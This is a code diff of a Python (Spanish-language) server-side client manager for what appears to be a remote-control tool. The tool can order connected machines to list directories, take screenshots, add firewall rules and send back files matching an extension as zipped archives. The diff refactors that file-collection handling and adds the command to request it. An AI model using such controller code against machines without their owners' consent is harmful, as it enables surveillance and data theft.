@@ -1,8 +1,4 @@
 import json
-import os
-import base64
-import zipfile
-import io
 from utils.logger import get_console
 from config.settings import RECEIVED_FILES_DIR
 from utils.response_waiter import ResponseWaiter
@@ -21,7 +17,7 @@ class ClientManager:
         self.servidor.establecer_client_manager(self)
         self.console = get_console()
         self._cmd = cmd 
-        self.response_waiter = ResponseWaiter(timeout=5)
+        self.response_waiter = ResponseWaiter(timeout=30)
         
         self.directory_handler = DirectoryHandler(self)
         self.screenshot_handler = ScreenshotHandler(self)
@@ -92,39 +88,13 @@ class ClientManager:
                 self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
             elif accion == "archivos_extension_enviados":
-                self._procesar_archivos_extension_enviados(datos_dict, cliente_id)
+                self.file_handler._procesar_archivos_extension_enviados(datos_dict, cliente_id)
+                self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
         except json.JSONDecodeError:
             self.console.print(f"[bold red][!] Error al decodificar respuesta del cliente: {datos}[/bold red]")
         except Exception as e:
             self.console.print(f"[bold red][!] Error al procesar respuesta del cliente: {e}[/bold red]")
-    
-    def _procesar_archivos_extension_enviados(self, datos_dict, cliente_id):
-        """Procesa archivos enviados por extensión."""
-        extension = datos_dict.get("extension")
-        cantidad_archivos = datos_dict.get("cantidad_archivos")
-        nombre_zip = datos_dict.get("nombre_zip")
-        ruta_destino = datos_dict.get("ruta_destino", RECEIVED_FILES_DIR)
-        datos_zip = datos_dict.get("datos_zip")
-        archivos_incluidos = datos_dict.get("archivos_incluidos", [])
-        
-        try:
-            carpeta_extraccion = os.path.join(ruta_destino, f"cliente_{cliente_id.replace('[Cliente ', '').replace(']', '')}_{extension.replace('.', '')}")
-            os.makedirs(carpeta_extraccion, exist_ok=True)
-            
-            with zipfile.ZipFile(io.BytesIO(base64.b64decode(datos_zip)), 'r') as zip_ref:
-                zip_ref.extractall(carpeta_extraccion)
-            
-            self.console.print(f"\n{cliente_id} [bold green]📁 Archivos por extensión procesados:[/bold green]")
-            self.console.print(f"{cliente_id} Extensión: {extension}")
-            self.console.print(f"{cliente_id} Cantidad de archivos: {cantidad_archivos}")
-            self.console.print(f"{cliente_id} Archivos extraídos en: {carpeta_extraccion}")
-            if len(archivos_incluidos) <= 10:
-                self.console.print(f"{cliente_id} Archivos incluidos: {', '.join(archivos_incluidos)}")
-            else:
-                self.console.print(f"{cliente_id} Archivos incluidos: {', '.join(archivos_incluidos[:10])}... y {len(archivos_incluidos)-10} más")
-        except Exception as e:
-            self.console.print(f"\n{cliente_id} [bold red]Error al procesar archivos por extensión:[/bold red] {str(e)}")
     
     def enviar_comando_listar_directorio(self, ruta, incluir_archivos=False, cliente_id=None):
         """Envía comando para listar un directorio."""
@@ -177,6 +147,12 @@ class ClientManager:
         exito_envio = self.firewall_handler.enviar_comando_agregar_regla(nombre, ip, puerto, accion, cliente_id)
 
         return self.comprobar_respuesta(exito_envio, "regla_firewall_agregada", cliente_id)
+    
+    def enviar_comando_archivos_por_extension(self, ruta_busqueda, extension, ruta_destino=None, cliente_id=None):
+        exito_envio = self.file_handler.enviar_comando_archivos_por_extension(ruta_busqueda, extension, ruta_destino, cliente_id)
+        
+        return self.comprobar_respuesta(exito_envio, "archivos_extension_enviados", cliente_id)
+
     def comprobar_respuesta(self, exito_envio, accion_esperada, cliente_id=None):
         if not exito_envio:
             return False
